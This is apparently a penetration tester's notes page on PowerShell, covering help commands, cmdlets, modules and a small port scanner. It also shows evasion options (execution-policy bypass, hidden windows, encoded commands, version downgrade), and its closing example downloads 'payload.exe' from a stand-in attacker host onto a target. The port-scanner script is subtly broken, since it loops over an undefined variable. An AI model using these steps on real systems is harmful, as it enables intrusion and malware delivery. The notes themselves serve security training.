# Powershell

**Powershell** is a powerful built-in shell and scripting environment we can utilize as penetration testers considering its wide-spread availability on all modern Windows-based systems.

> The use of Powershell allows us to take advantage of the "**living-off-the-land**" concept, where using tools that are built-in to the Operating System work to our adbantage once we've obtained access to a system
>
> [https://www.secureworks.com/blog/living-off-the-land](https://www.secureworks.com/blog/living-off-the-land)

#### PowerSploit

PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.&#x20;

{% embed url="https://github.com/PowerShellMafia/PowerSploit" %}

### Powershell CLI

```powershell
# get help in powershell cli 
powershell /?
```

<pre class="language-powershell"><code class="lang-powershell"><strong># Get-Help
</strong><strong>
</strong># get help of a particular command (like man in unix)
Get-Help Get-Help -Full
Get-Help Get-Help -Example
Get-Help Get-Help -Online # online page

# Update help library
Update-Help
</code></pre>

#### Get-Command

It allows us to list all cmdlets, aliases, functions, workflows, filters, scripts, and any applications that are available for us to use in PowerShell

```powershell
# Get-Command
Get-Command -Name *Firewall*
```

***

### PowerShell Options

#### -ExecutionPolicy

The PowerShell execution policy determines which scripts if any, we can run and can easily be disable with the "Bypass" or "Unrestricted" arguments.

<pre class="language-powershell"><code class="lang-powershell"><strong>powershell.exe -ExecutionPolicy Bypass .\script.ps1
</strong>powershell.exe -ep Bypass .\script.ps1 # short command
powershell.exe -ep by .\script.ps1 # short command

powershell.exe -ExecutionPolicy Unrestricted.\script.ps1
</code></pre>

#### -WindowsStyle

The _-WindowsStyl_ parameter hides the Powershell window when used with the "hidden" argument.

```powershell
powershell.exe -WindowStyle Hidden .\script.ps1
powershell.exe -W h .\script.ps1 # short command
powershell.exe -Wi hi  .\script.ps1 # short command
```

#### -Command

The _-Command_ parameter is used to specify a Command or Script Block to run.

```powershell
powershell.exe -Command Get-Process
powershell.exe -Command "& { Get-EventLog -LogName security }"
```

#### -EncodedCommand

The _-EncodedCommand_ parameter is used to execute base64 encoded scripts or commands

```powershell
powershell.exe -EncodedCommand $encodedCommand
powershell.exe -enco $encodedCommand # short command
powershell.exe -ec $encodedCommand # short command
```

#### -NoProfile

The _-NoProfile_ parameter don't load any powershell profiles

> **Profiles** are essentially scripts that run when the powershell executable is launched and can interfere with out operations

```powershell
powershell.exe -NoProfile .\script.ps1
```

#### -Version

We can use the -Version parameter followed by a version number as the argument to downgrade the version of powershell.

> Useful in scenarios where you've landed on a machine with a more recent version and need to downgrade to Version 1.0 or 2.0 to complete certain tasks.
>
> Requires that older versions are stille installed on the target.

```powershell
powershell.exe -Version 2
```

***

### Powershell Cmdlets

**cmdlet** -- pronounced command-let -- is a small, lightweight command that is used in the Windows PowerShell environment. A cmdlet typically exists as a small script that is intended to perform a single specific function such as coping files and changing directories.

{% hint style="info" %}
[https://www.techtarget.com/whatis/definition/cmdlet](https://www.techtarget.com/whatis/definition/cmdlet)
{% endhint %}

```powershell
# ex.
Get-ChildItem
Get-Process
```

#### Get-Process

```powershell
# Create a table with ProcessName and Id of the process 
Get-Process | Sort-Object -Unique | Select-Object ProcessName, Id
```

<pre class="language-powershell"><code class="lang-powershell"><strong># Get a program path from process name utilize pipes
</strong><strong>Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path
</strong></code></pre>

#### Get-Alias

Use this cmdlet with thr "-Definition" parameter followed by a cmdlet name to find what the **aliases**.

```powershell
Get-Alias -Definition Get-ChildItem
```

#### Get-WmiObject

Allow us to view Windows information&#x20;

```powershell
Get-WmiObject -class win32_operatingsystem | select -Property * | Select-Object Version
```

***

### PowerShell Modules

A module is a set of PowerShell functionalities grouped together in the form of a single file that will typically have a ".psm1" file extension.

There are also several different types of modules:

* [Script Modules](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/10-script-modules?view=powershell-7.4)
* [Binary Modules](https://learn.microsoft.com/it-it/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7.4)
* [Manifest Modules](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7.4)
* Dynamic Modules

```powershell
# to obtain a list of all currently imported modules
Get-Module
```

```powershell
# to obtain a list of all available modules
Get-Module -ListAvailable
```

```powershell
# import a local module
Import-Module .\module.psm1

# Find a online module
Find-Module -Name PowerShellGet

# install online module by name
Install-Module -Name PowerShellGet
```

{% hint style="info" %}
Install-Module Microsoft page\
[https://learn.microsoft.com/en-us/powershell/module/powershellget/install-module?view=powershellget-3.x](https://learn.microsoft.com/en-us/powershell/module/powershellget/install-module?view=powershellget-3.x)
{% endhint %}

***

### PowerShell Scripts

Example of simple powershell script that get file contents

<pre class="language-powershell" data-title="example.ps1"><code class="lang-powershell"><strong>Param(
</strong>    [parameter(mandatory=$true)][string]$file
)
Get-Content "$file"
</code></pre>

Run this script in powershell with this command

```powershell
.\example.ps1 users.txt

# output
john
sara
adam
...
```

#### Simple TCP Port scanner script

{% code overflow="wrap" lineNumbers="true" %}
```powerquery
Param(
    [parameter(mandatory=$true)][string]$ip
)

$port=(80,445);

foreach ($port in $ports) { 
    try { 
        $socket=New-Object System.Net.Sockets.TcpClient($ip,$port); 
    } catch{};
    if ($socket -eq $null) {
        echo $ip":"$port" -Closed";
    } else {
        echo $ip":"$port" - Open"; $socket = $null;
    }
}
```
{% endcode %}

***

### PowerShell Objects

#### Creating .NOT Objects

```powershell
$webclient = New-Object System.Net.WebClient

$payload_url = "https://ATT_IP/payload.exe"
$file = "C:\ProgramData\payload.exe"
$webclient.DownloadFile($payload_url,$file)
```

































